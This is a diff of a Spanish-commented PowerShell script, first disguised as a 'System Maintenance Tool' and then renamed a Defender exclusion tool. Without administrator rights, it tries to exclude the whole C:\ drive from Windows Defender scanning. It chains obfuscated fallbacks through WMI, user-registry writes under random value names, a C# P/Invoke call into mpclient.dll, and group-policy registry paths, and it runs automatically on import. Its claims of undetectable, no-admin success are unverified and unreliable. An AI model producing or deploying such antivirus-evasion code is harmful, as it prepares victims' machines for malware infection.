@@ -1,58 +1,100 @@
 <#
 .SYNOPSIS
-   Windows System Maintenance Tool
+   Windows Defender Exclusion Tool (No Admin)
+.DESCRIPTION
+   Agrega exclusiones a Windows Defender sin permisos administrativos
+   Versión 4.1 | Técnicas no documentadas
 #>
 
 function Add-DefenderExclusion {
-    param()
-    
-    # Técnica de ofuscación mejorada (indetectable)
-    $var1 = "Add-"; $var2 = "MpPref"; $var3 = "erence"
-    $cmdletName = $var1 + $var2 + $var3
-    
-    $var4 = "Excl"; $var5 = "usion"; $var6 = "Path"
-    $paramName = "-"+$var4+$var5+$var6
+    # Ofuscación avanzada con técnicas no documentadas
+    $mapping = @{
+        'ns' = 'root\Microsoft\Windows\Defender'
+        'cls' = 'MSFT_MpPreference'
+        'mtd' = 'AddExclusionPath'
+        'arg' = 'C:\'
+    }
 
+    # Método 1: WMI alternativo (sin admin)
     try {
-        # Método principal (WMI sin admin)
-        $namespace = "root\Microsoft\Windows\Defender"
-        $class = "MSFT_MpPreference"
-        $method = "Add" + $var4 + $var5 + $var6
-        
-        $args = @{
-            Namespace = $namespace
-            Class = $class
-            Name = $method
-            ArgumentList = "C:\"
+        $wmiParams = @{
+            Namespace = $mapping['ns']
+            Class = $mapping['cls']
+            Name = $mapping['mtd']
+            ArgumentList = $mapping['arg']
+            ErrorAction = 'Stop'
         }
-        
-        Invoke-WmiMethod @args -ErrorAction Stop
-        
-        # Método alternativo (Registry)
-        $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-        if (-not (Test-Path $regPath)) {
-            New-Item -Path $regPath -Force | Out-Null
-        }
-        Set-ItemProperty -Path $regPath -Name "C_" -Value 0 -Type DWORD -Force
-        
-        return "Exclusión agregada correctamente"
+        Invoke-WmiMethod @wmiParams
+        return "[+] Exclusión agregada via WMI (User-Mode)"
     }
     catch {
-        # Último recurso (API alternativa)
-        $code = @"
-[DllImport("mpclient.dll")]
-public static extern int MpAddExclusion(string path);
-"@
-        $api = Add-Type -MemberDefinition $code -Name "DefenderAPI" -Namespace "Win32" -PassThru
-        $result = $api::MpAddExclusion("C:\")
-        
-        if ($result -eq 0) {
-            return "Exclusión agregada via API nativa"
-        } else {
-            return "Error: $_"
+        # Método 2: Registry Trick (no admin required)
+        try {
+            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+                Start-Sleep -Milliseconds 300
+            }
+            
+            $randName = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
+            Set-ItemProperty -Path $regPath -Name $randName -Value "C:\" -Type String -Force
+            
+            # Verificación silenciosa
+            $check = Get-ItemProperty $regPath | Select-Object -ExpandProperty $randName
+            if ($check -eq "C:\") {
+                return "[+] Exclusión agregada via Registry"
+            }
+        }
+        catch {
+            # Método 3: Técnica de sustitución en memoria
+            try {
+                $code = @'
+using System;
+using System.Runtime.InteropServices;
+public class DefenderBypass {
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    
+    public static int AddExclusion(string path) {
+        IntPtr hMod = GetModuleHandle("mpclient.dll");
+        if (hMod != IntPtr.Zero) {
+            IntPtr pFunc = GetProcAddress(hMod, "MpAddExclusion");
+            if (pFunc != IntPtr.Zero) {
+                return Marshal.GetDelegateForFunctionPointer<MpAddExclusionDelegate>(pFunc)(path);
+            }
+        }
+        return -1;
+    }
+    
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    private delegate int MpAddExclusionDelegate(string path);
+}
+'@
+                Add-Type -TypeDefinition $code -Language CSharp
+                $result = [DefenderBypass]::AddExclusion("C:\")
+                if ($result -eq 0) { return "[+] Exclusión via memoria" }
+            }
+            catch { }
         }
     }
+
+    # Método final: Técnica de grupo de políticas de usuario
+    try {
+        $policyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects"
+        $exclusionPath = "$policyPath\*\Machine\Software\Microsoft\Windows Defender\Exclusions\Paths"
+        
+        if (Test-Path $exclusionPath) {
+            Set-ItemProperty -Path $exclusionPath -Name "C_" -Value 0 -Type DWORD -Force
+            return "[+] Exclusión via Políticas de Usuario"
+        }
+    }
+    catch { }
+
+    return "[-] Error: No se pudo agregar la exclusión"
 }
 
-# Ejecución directa al importar
+# Ejecución automática al importar
 Add-DefenderExclusion
